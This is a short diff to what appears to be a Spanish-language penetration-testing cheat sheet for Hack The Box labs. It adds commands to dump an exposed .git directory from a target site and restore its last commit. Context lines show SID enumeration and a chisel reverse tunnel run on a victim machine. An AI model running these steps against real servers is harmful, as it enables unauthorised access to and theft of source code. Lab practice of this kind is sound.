@@ -450,7 +450,13 @@ Encuentre más SID :lsaenumsid Ciclo RID (verifique más SID) :lookupsids <sid>
 `./chisel client <ip-host-remote>:8000 R:80:localhost:80` # En la maquina victima
 
 
- 
+# GIT
+
+`./gitdumper.sh http://domain.htb/.git/ /Path/git` # dumpeamos el git
+
+`cd /Path/git && git status` # vemos los ultimos commit
+
+`git reset --hard` # recuperamos el ultimo commit
 
 
 
